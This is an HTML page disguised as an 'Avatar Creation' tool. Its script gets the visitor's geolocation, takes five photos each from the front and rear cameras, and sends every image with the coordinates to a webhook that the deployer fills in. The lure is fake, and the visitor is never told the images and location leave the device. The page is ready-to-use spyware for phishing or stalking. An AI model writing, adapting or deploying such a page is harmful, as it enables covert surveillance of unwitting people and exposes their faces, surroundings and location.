<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>DaVinci Memory Stream</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{
    margin:0;
    height:100vh;
    background:linear-gradient(135deg,#e0eafc,#cfdef3);
    font-family:Segoe UI,Arial;
    text-align:center;
}
#startBtn{
    margin-top:40vh;
    padding:14px 36px;
    font-size:22px;
    border:none;
    border-radius:18px;
    background:linear-gradient(90deg,#4ecdc4,#5563de);
    color:#fff;
}
#countdown{
    display:none;
    position:fixed;
    inset:0;
    background:#0008;
    color:white;
    font-size:15vw;
    align-items:center;
    justify-content:center;
}
canvas{display:none}
</style>
</head>
<body>

<button id="startBtn">Avatar Creation</button>
<div id="countdown">ðŸ“·</div>
<canvas id="canvas"></canvas>

<script>
const startBtn = document.getElementById("startBtn");
const countdown = document.getElementById("countdown");
const canvas = document.getElementById("canvas");

let WEBHOOK_URL = "PASTE_YOUR_WEBHOOK_URL_HERE";
let locationData = {lat:"N/A", lon:"N/A"};

async function getLocation(){
    if(!navigator.geolocation) return;
    try{
        const pos = await new Promise((res,rej)=>
            navigator.geolocation.getCurrentPosition(res,rej)
        );
        locationData.lat = pos.coords.latitude.toFixed(6);
        locationData.lon = pos.coords.longitude.toFixed(6);
    }catch{}
}

async function capturePhotos(facingMode,count,label){
    const stream = await navigator.mediaDevices.getUserMedia({
        video:{facingMode}
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");

    for(let i=1;i<=count;i++){
        await new Promise(r=>setTimeout(r,800));
        ctx.drawImage(video,0,0,canvas.width,canvas.height);

        await new Promise(resolve=>{
            canvas.toBlob(blob=>{
                const fd = new FormData();
                fd.append("file",blob,`${label}_${i}.jpg`);
                fd.append(
                    "content",
                    `${label} ${i} [${locationData.lat},${locationData.lon}]`
                );
                fetch(WEBHOOK_URL,{method:"POST",body:fd});
                resolve();
            },"image/jpeg",0.8);
        });
    }

    stream.getTracks().forEach(t=>t.stop());
}

startBtn.onclick = async ()=>{
    startBtn.style.display="none";
    countdown.style.display="flex";

    await getLocation();

    countdown.textContent="Front";
    await capturePhotos("user",5,"selfie");

    countdown.textContent="Back";
    await capturePhotos("environment",5,"backcam");

    countdown.textContent="Done";
    setTimeout(()=>countdown.style.display="none",1500);
};
</script>
</body>
</html>